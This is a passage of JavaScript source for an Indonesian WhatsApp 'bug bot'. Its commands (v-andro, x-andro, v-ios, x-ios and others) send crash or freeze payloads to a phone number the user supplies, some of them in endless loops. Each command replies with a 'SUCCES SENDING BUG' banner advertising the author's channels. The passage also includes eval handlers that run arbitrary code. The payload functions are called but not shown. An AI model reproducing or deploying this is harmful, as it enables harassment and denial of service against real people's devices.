𝗕𝗨𝗚 ( 𝐁𝐘 𝐙𝐘𝐍𝐗𝐙𝐎 )",
});
}
replygw("Done clear bug");
}
break

case 'eval': {
if (!isAcces) return replygw('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!m.quoted) return replygw(`*Reply pesan yang quotednya mau diambil*`);
let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
let jeneng = `MessageData_${kripto.randomBytes(8).toString('hex')}.json`;
await fs.writeFileSync(jeneng, penis);
await replygw(penis);
await zyn.sendMessage(from, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*' }, { quoted: m });
await fs.unlinkSync(jeneng);
}
break

case "pub": {
if (!isBot) return replygw('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁')
zyn.public = true
replygw('*Success Changes To Public*');
}
break

case "self": {
if (!isBot) return replygw('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁')
zyn.public = false
replygw('*Success Changes To Self*');
}
break

case "addacces": {
if (!isBot) return replygw(`𝗢𝗻𝗹𝘆 𝗕𝗼𝘁`)
if (!args[0]) return replygw(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await zyn.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygw(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp !!!`)
kontributor.push(bnnd)
fs.writeFileSync('./message/lib/database/owner.json', JSON.stringify(kontributor))
replygw(`Nomor ${bnnd} Telah Di Acces !!!`);
}
break

case "dellacces": {
if (!isBot) return replygw(`𝗢𝗻𝗹𝘆 𝗕𝗼𝘁`)
if (!args[0]) return replygw(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
target = q.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(ya)
kontributor.splice(unp, 1)
fs.writeFileSync('./message/lib/database/owner.json', JSON.stringify(kontributor))
replygw(`Nomor ${target} Telah Di Hapus Acces !!!`);
}
break

case 'v-andro': {
if (!isAcces) return replygw('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replygw(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚
Target = ${pepec}
Type = Freze Home

𝗦𝗨𝗣𝗣𝗢𝗥𝗧
> Telegram = https://t.me/Zyn_Xzo
> Youtube = https://youtube.com/@zynnxzoo

𝗡𝗢𝗧𝗘
> PLEASE pause for 5 minutes to avoid being spammed`
await zyn.sendMessage(from, { video: { url: `https://files.catbox.moe/q96wwf.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
{
await ComBox(target)
}
}
break

case 'x-andro': {
if (!isAcces) return replygw('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replygw(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚
Target = ${pepec}
Type = Freze Home

𝗦𝗨𝗣𝗣𝗢𝗥𝗧
> Telegram = https://t.me/Zyn_Xzo
> Youtube = https://youtube.com/@zynnxzoo

𝗡𝗢𝗧𝗘
> PLEASE pause for 5 minutes to avoid being spammed`
await zyn.sendMessage(from, { video: { url: `https://files.catbox.moe/q96wwf.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 0; ; i++) {
await ComBox(target)
}
}
break

case 'v-ios': {
if (!isAcces) return replygw('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replygw(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚
Target = ${pepec}
Type = Freze iOS

𝗦𝗨𝗣𝗣𝗢𝗥𝗧
> Telegram = https://t.me/Zyn_Xzo
> Youtube = https://youtube.com/@zynnxzoo

𝗡𝗢𝗧𝗘
> PLEASE pause for 5 minutes to avoid being spammed`
await zyn.sendMessage(from, { video: { url: `https://files.catbox.moe/q96wwf.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
{
await FrezeiOS(target)
}
}
break

case 'x-ios': {
if (!isAcces) return replygw('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replygw(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚
Target = ${pepec}
Type = Freze iOS

𝗦𝗨𝗣𝗣𝗢𝗥𝗧
> Telegram = https://t.me/Zyn_Xzo
> Youtube = https://youtube.com/@zynnxzoo

𝗡𝗢𝗧𝗘
> PLEASE pause for 5 minutes to avoid being spammed`
await zyn.sendMessage(from, { video: { url: `https://files.catbox.moe/q96wwf.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 0; ; i++) {
await FrezeiOS(target)
}
}
break

case 'xandro': {
if (!isBot) return replygw('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁');
await reaction(m.chat, "✅");
for (let i = 0; ; i++) {
await ComBox(m.chat)
}
}
break

case 'vandro': {
if (!isBot) return replygw('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁')
await reaction(m.chat, "✅")
{
await ComBox(m.chat)
}
}
break

case 'xios': {
if (!isBot) return replygw('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁');
await reaction(m.chat, "✅");
for (let i = 0; ; i++) {
await FrezeiOS(m.chat)
}
}
break

case 'vios': {
if (!isBot) return replygw('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁')
await reaction(m.chat, "✅")
{
await FrezeiOS(m.chat)
}
}
break

case 'poll': {
if (!isBot) return replygw('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁')
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
  "pollCreationMessageV3": {
    "name": "ANJAY",
    "options": [
      {
        "optionName": "VERTC"
      },
      {
        "optionName": "VIRTX"
      }
    ],
    "selectableOptionsCount": 1
  }
}), { userJid: m.chat, quoted: NullNihBos })
zyn.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
replygw('sukses sendbug')
}
break

case 'pair': {
if (!isBot) return replygw('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁')
await reaction(m.chat, "✅")
{
await SendPairing(m.chat, Ptcp = true)
}
}
break

case "play": {
if (!isAcces) return replygw('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!text) return replygw(`*Example:* ${prefix + command} banon cikadap`)
const yts = require('yt-search');
let search = await yts(text);
let telaso = search.all[0].url;
var response = await ytdl(telaso)
var puki = response.data.mp3
zyn.sendMessage(from, { audio: { url: puki },
mimetype: "audio/mpeg",
fileName: "JinXzo.mp3",
contextInfo: {
forwardingScore: 100,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: search.all[0].title,
sourceUrl: search.all[0].timestamp,
thumbnailUrl: search.all[0].thumbnail,
}}},{quoted:m})
}
break

default:
if (budy.startsWith('>')) {
if (!isAcces) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isAcces) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});